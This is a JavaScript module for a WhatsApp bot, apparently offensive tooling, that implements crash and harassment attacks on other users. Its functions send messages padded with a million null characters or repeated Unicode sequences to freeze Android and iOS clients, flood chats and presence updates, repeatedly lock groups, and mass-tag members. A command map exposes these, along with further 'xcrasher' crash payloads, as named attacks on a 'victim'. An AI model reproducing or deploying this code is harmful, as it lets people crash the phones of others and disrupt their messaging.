'use strict';
const settings = require('../settings');

function wa() { return require('../main'); }

const NULLS = '\u0000'.repeat(1000000);
const IOS_SEQ = '\u{111C2}\u{111B5}\u{111B4}\u{111BF}';
const MARK = '𖤂';
const BUG_IMG = settings.BUG_IMAGE || 'https://i.ibb.co/SXtghycC/IMG-9633.jpg';
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

/* ── xcrasher bridge (lazy + guarded) ─────────────────────────────────────── */
let _xc = null;
function xc() {
  if (_xc) return _xc;
  try { _xc = require('./xcrasher'); } catch { _xc = {}; }
  return _xc;
}
function call(fn, ...a) {
  const m = xc();
  const f = m[fn];
  if (typeof f !== 'function') throw new Error(`xcrasher.${fn} not available`);
  return f(...a);
}
const num = (v, def, max) => Math.min(parseInt(v, 10) || def, max);

/* ── toaa freeze (Android) ────────────────────────────────────────────────── */
async function toaaFreeze(conn, jid) {
  const { generateWAMessageFromContent } = wa();

  const built = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: 'toaa freeze',
      contextInfo: {
        mentionedJid: [],
        isForwarded: true,
        forwardingScore: 999,
        inapp_signup: {
          title: NULLS,
          body: '7eppsynC',
          source: 'toaa',
          renderMode: 1
        }
      }
    }
  }, { userJid: conn.user.id });

  await conn.relayMessage(jid, built.message, { messageId: built.key.id });
}

/* ── fiOS (iOS view-once loop) ────────────────────────────────────────────── */
async function fiOS(conn, jid, rounds = settings.FREEZE_ROUNDS || 3) {
  const { generateWAMessageFromContent } = wa();

  for (let i = 0; i < rounds; i++) {
    const built = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: 'toaa freeze',
            footerText: MARK,
            headerType: 1,
            contextInfo: { mentionedJid: [], isSecret: true },
            buttons: [{
              buttonId: '1',
              type: 1,
              buttonText: { displayText: IOS_SEQ.repeat(1000) }
            }]
          }
        }
      }
    }, { userJid: conn.user.id });

    await conn.relayMessage(jid, built.message, { messageId: built.key.id });
    await sleep(1000);
  }
}

/* ── lock_group ───────────────────────────────────────────────────────────── */
async function lockGroup(conn, jid, rounds = 75) {
  for (let i = 0; i < rounds; i++) {
    try { await conn.groupSettingUpdate(jid, 'announcement'); } catch {}
    await sleep(500);
  }
}

/* ── groupBan ─────────────────────────────────────────────────────────────── */
async function groupBan(conn, jid) {
  const { generateWAMessageFromContent } = wa();
  const built = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: 'toaa freeze',
      contextInfo: {
        mentionedJid: [],
        isForwarded: true,
        forwardingScore: 999,
        inapp_signup: { title: NULLS, body: '7eppsynC' }
      }
    }
  }, { userJid: conn.user.id });
  await conn.relayMessage(jid, built.message, { messageId: built.key.id });
  await lockGroup(conn, jid);
}

/* ── lag (relay burst) ────────────────────────────────────────────────────── */
async function lag(conn, jid, rounds = settings.LAG_ROUNDS || 25) {
  const { generateWAMessageFromContent } = wa();

  for (let i = 0; i < rounds; i++) {
    const built = generateWAMessageFromContent(jid, {
      extendedTextMessage: {
        text: MARK.repeat(2) + ' ' + i,
        contextInfo: { mentionedJid: [], isForwarded: true, forwardingScore: 999 }
      }
    }, { userJid: conn.user.id });

    await conn.relayMessage(jid, built.message, { messageId: built.key.id });
    await sleep(60);
  }
}

/* ── delay (single oversized body) ────────────────────────────────────────── */
async function bigText(conn, jid, chars = settings.DELAY_CHARS || 60000) {
  const { generateWAMessageFromContent } = wa();
  const built = generateWAMessageFromContent(jid, {
    extendedTextMessage: {
      text: MARK.repeat(chars),
      contextInfo: { mentionedJid: [], isForwarded: true, forwardingScore: 999 }
    }
  }, { userJid: conn.user.id });

  await conn.relayMessage(jid, built.message, { messageId: built.key.id });
}

/* ── spam (presence churn + burst) ────────────────────────────────────────── */
async function spam(conn, jid, rounds = settings.SPAM_ROUNDS || 20) {
  const { generateWAMessageFromContent } = wa();

  for (let i = 0; i < rounds; i++) {
    try { await conn.sendPresenceUpdate(i % 2 ? 'available' : 'composing', jid); } catch {}
    const built = generateWAMessageFromContent(jid, {
      extendedTextMessage: {
        text: MARK + ' ' + (i + 1),
        contextInfo: { mentionedJid: [], isForwarded: true, forwardingScore: 999 }
      }
    }, { userJid: conn.user.id });
    await conn.relayMessage(jid, built.message, { messageId: built.key.id });
    await sleep(250);
  }
}

/* ── tagAll ───────────────────────────────────────────────────────────────── */
async function tagAll(conn, jid) {
  const meta = await conn.groupMetadata(jid);
  const ids = (meta.participants || []).map(p => p.id);
  const body = [
    MARK.repeat(4),
    'toaa tag all',
    MARK.repeat(4),
    '',
    ids.map(i => `${MARK} @${i.split('@')[0]}`).join('\n')
  ].join('\n');

  await conn.sendMessage(jid, { text: body, mentions: ids });
}

async function sendBugImage(conn, jid) {
  try {
    await conn.sendMessage(jid, {
      image: { url: BUG_IMG },
      caption: '℘ 𝙏𝙊𝘼𝘼 𝙚𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜 𝙫𝙞𝙘𝙩𝙞𝙢 ℘'
    });
  } catch {}
}

/* ── command map ──────────────────────────────────────────────────────────── */
const TARGET_COMMANDS = {
  'order-bug':      { groupOnly: false, run: (c, j, r) => call('orderBug', c, j, r.join(' ') || 'X-Crasher') },
  'newsletter':     { groupOnly: false, run: (c, j) => call('newsletterBug', c, j) },
  'location':       { groupOnly: false, run: (c, j) => call('locationBug', c, j) },
  'sticker':        { groupOnly: false, run: (c, j) => call('stickerBug', c, j) },
  'status-mention': { groupOnly: false, run: (c, j) => call('statusMentionBug', c, j) },
  'doc-crash':      { groupOnly: false, run: (c, j) => call('docCrashBug', c, j) },
  'flow':           { groupOnly: false, run: (c, j) => call('flowResponseBug', c, j) },
  'pairing':        { groupOnly: false, run: (c, j, r) => call('pairingBug', j.split('@')[0], num(r[0], 10, 30)) },

  'freeze-droid':   { groupOnly: false, run: (c, j) => toaaFreeze(c, j) },
  'freeze-ios':     { groupOnly: false, run: (c, j, r) => fiOS(c, j, num(r[0], settings.FREEZE_ROUNDS || 3, 10)) },
  'lag':            { groupOnly: false, run: (c, j, r) => lag(c, j, num(r[0], settings.LAG_ROUNDS || 25, 60)) },
  'delay':          { groupOnly: false, run: (c, j, r) => bigText(c, j, num(r[0], settings.DELAY_CHARS || 60000, 250000)) },
  'spam':           { groupOnly: false, run: (c, j, r) => spam(c, j, num(r[0], settings.SPAM_ROUNDS || 20, 50)) },
  'lockgroup':      { groupOnly: true,  run: (c, j) => lockGroup(c, j) },
  'bangroup':       { groupOnly: true,  run: (c, j) => groupBan(c, j) },
  'tagall':         { groupOnly: true,  run: (c, j) => tagAll(c, j) }
};

module.exports = {
  toaaFreeze, fiOS, lockGroup, groupBan,
  lag, bigText, spam, tagAll,
  sendBugImage, TARGET_COMMANDS
};